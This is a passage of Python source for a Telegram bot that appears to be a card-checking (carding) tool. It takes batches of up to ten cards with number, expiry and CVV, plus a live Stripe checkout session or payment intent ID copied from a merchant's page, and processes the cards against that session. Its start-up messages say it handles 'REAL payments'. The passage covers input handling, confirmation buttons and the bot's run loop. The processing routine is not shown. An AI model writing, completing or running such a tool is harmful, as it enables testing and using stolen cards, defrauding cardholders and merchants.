            for line in lines[:10]:
                card = Card.from_string(line)
                if card:
                    cards.append(card)
            
            if not cards:
                await update.message.reply_text("❌ No valid cards found")
                return
            
            keyboard = [[
                InlineKeyboardButton("✅ Process", callback_data="process"),
                InlineKeyboardButton("❌ Cancel", callback_data="cancel")
            ]]
            
            context.user_data['cards'] = cards
            
            await update.message.reply_text(
                f"*Process {len(cards)} cards?*",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        
        elif state == WAITING_PI:
            # Handle manual payment intent/session ID entry
            session_id = text.strip()
            
            # Validate session ID formats (both cs_ and pi_ formats)
            if re.match(r'^(cs|pi)_(live|test)_[a-zA-Z0-9]+$', session_id):
                # Create a dummy URL and store the session ID
                context.user_data['url'] = f"manual://{session_id}"
                context.user_data['payment_info'] = {
                    'payment_intent_id': session_id,
                    'amount': None,
                    'currency': 'usd',
                    'merchant': 'Manual Entry'
                }
                context.user_data['state'] = WAITING_CARDS
                
                await update.message.reply_text(
                    f"✅ Session ID set: `{session_id}`\n\n"
                    f"Send cards (one per line, max 10):\n"
                    f"`4111111111111111|12|25|123`",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text(
                    "❌ Invalid Session ID format.\n"
                    "Format: `cs_live_xxxxxxxxx` or `pi_live_xxxxxxxxx`\n"
                    "Example: `cs_live_a1ynMM0QzfNcXZpJIUZQfC1Q21ZQBPkztixaJGTghavkOK1GnpN3awPLRa`",
                    parse_mode='Markdown'
                )
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        if query.data == "cancel":
            context.user_data.clear()
            await query.edit_message_text("❌ Cancelled")
        
        elif query.data == "process":
            await self.process_cards(update, context)
        
        elif query.data == "manual_pi":
            context.user_data['state'] = WAITING_PI
            await query.edit_message_text(
                "Please send the Checkout Session ID or Payment Intent ID:\n\n"
                "From your URL, use: `cs_live_a1ynMM0QzfNcXZpJIUZQfC1Q21ZQBPkztixaJGTghavkOK1GnpN3awPLRa`\n\n"
                "Format: `cs_live_xxxxxxxxx` or `pi_live_xxxxxxxxx`",
                parse_mode='Markdown'
            )
    
    async def run(self):
        """Run the bot"""
        print("🚀 Starting REAL Stripe Bot...")
        print("✅ Ready to process REAL payments")
        print("Press Ctrl+C to stop")
        
        await self.app.initialize()
        await self.app.start()
        await self.app.updater.start_polling(drop_pending_updates=True)
        
        try:
            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            await self.shutdown()
    
    async def shutdown(self):
        """Clean shutdown"""
        await self.stripe.close()
        await self.app.updater.stop()
        await self.app.stop()
        await self.app.shutdown()
        print("👋 Bot stopped")

# ============= MAIN =============
async def main():
    bot = CheckoutBot(BOT_TOKEN)
    await bot.run()

if __name__ == "__main__":
    asyncio.run(main())